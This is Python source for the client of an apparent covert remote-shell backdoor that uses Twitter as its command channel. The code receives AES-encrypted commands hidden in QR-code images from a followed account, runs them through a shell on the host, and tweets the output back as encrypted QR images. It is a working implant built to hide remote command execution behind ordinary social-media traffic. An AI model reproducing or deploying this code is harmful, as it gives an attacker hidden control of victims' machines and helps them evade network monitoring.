import time
import tweepy
import os
import zlib
import qrcode
from pyzbar.pyzbar import decode
from PIL import Image
import base64
from encryption import AESCipher, load_keys
import pickle
import json
import subprocess
import requests
from io import BytesIO
from api_keys import api_keys
# we using QRs cause twitter character limit banter

# create listener
class ClientListener(tweepy.StreamListener):
    def __init__(self, client_id, api, cipher_key):
        self.client_id = client_id
        self.api = api
        self.cipher = AESCipher(cipher_key)
        self.connection_confirm()


    def on_data(self, raw_data):
        # process raw stream data, read qr, pipe message
        self.process_raw(raw_data)
        return True

    def process_raw(self, raw_data):
        # do stuff here, raw_data is a string
        data = json.loads(raw_data)
        tweet = self.read_message(data)

        if self.client_id in tweet and self._tweet_type(tweet) == 'connection_confirm':
            pass

        if self.client_id in tweet and self._tweet_type(tweet) == 'command':
            # this is a command
            command = tweet.split('::::')[1]
            response = self._execute_command(command)
            self.post_response(f'{response}')

    def on_error(self, status_code):
        if status_code == 420:
            return False
#-------------------------------------------------------Private subs-------------------------------------------------------#
    # private sub for command execution
    def _execute_command(self, command):
        if command[:2] == 'cd':
            os.chdir(command[3:])
        cmd = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
        output_bytes = cmd.stdout.read() + cmd.stderr.read()
        response = str(output_bytes, "utf-8") + str(os.getcwd()) + '> '
        return response

    def _tweet_type(self, tweet):
        if tweet.split('::::'):
            return tweet.split('::::')[-1]
        return 'empty'

#-------------------------------------------------------Public subs-------------------------------------------------------#
    def generate_qr(self, message):
        # encode to base_64 and generate_qr
        message = self.cipher.encrypt(message)
        message = base64.b64encode(message.encode('utf-8'))
        qr = qrcode.make(message)
        return qr

    def read_qr(self, img):
        message = decode(img)[0].data.decode()
        message = base64.b64decode(message).decode('utf-8')
        return self.cipher.decrypt(message)

    def post_response(self, message):
        # need encryption here but later problem
        qr = self.generate_qr(message)
        qr.save('response.jpg')
        # post to twitter
        self.api.update_with_media('response.jpg')
        os.remove('response.jpg')
        return True

    def read_message(self, tweet_data):
        if 'media' in tweet_data['entities']:
            if 'media_url_https' in tweet_data['entities']['media'][0]:
                # get image
                response = requests.get(tweet_data['entities']['media'][0]['media_url_https'])
                img = Image.open(BytesIO(response.content))
                message = self.read_qr(img)
                return message
        else:
            return tweet_data['text']

    def connection_confirm(self):
        message = f'{self.client_id}::::connection_confirm'
        self.post_response(message)
        return True

# create stream
class ShellStream():
    def __init__(self, auth, listener):
        self.stream = tweepy.Stream(auth=auth, listener=listener)

    def start(self, user_id):
        self.stream.filter(follow = [user_id])


if __name__ == '__main__':
    client_id, aeskey = load_keys()

    auth = tweepy.OAuthHandler(api_keys['consumer_key'], api_keys['consumer_secret'])
    auth.set_access_token(api_keys['access_token'], api_keys['access_token_secret'])
    api = tweepy.API(auth)

    stream = ShellStream(auth = auth, listener=ClientListener(client_id, api, aeskey))
    stream.start(api_keys['my_user_id'])
